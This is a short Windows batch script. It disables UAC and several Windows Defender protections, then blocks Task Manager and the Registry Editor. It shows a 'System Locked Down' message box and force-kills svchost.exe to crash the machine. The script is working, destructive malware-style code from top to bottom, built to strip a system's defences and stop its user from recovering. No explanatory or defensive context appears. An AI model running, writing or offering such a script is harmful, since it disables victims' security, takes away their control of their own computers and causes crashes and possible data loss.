@echo off

:: --- 1. Disable UAC ---
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLua /t REG_DWORD /d 0 /f

:: --- 2. Disable Windows Defender ---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f

:: --- 3. Disable Task Manager ---
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: --- 4. Disable Registry Editor ---
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

:: --- 5. Show Message Box ---
echo MsgBox "UAC, Defender, Task Manager, and Regedit have been disabled." ^& vbCrLf ^& "System will now restart.", 64, "System Locked Down" > "%temp%\msgbox.vbs"
cscript //nologo "%temp%\msgbox.vbs"
del "%temp%\msgbox.vbs"

:: --- 6. Force System Crash ---
taskkill /IM svchost.exe /F
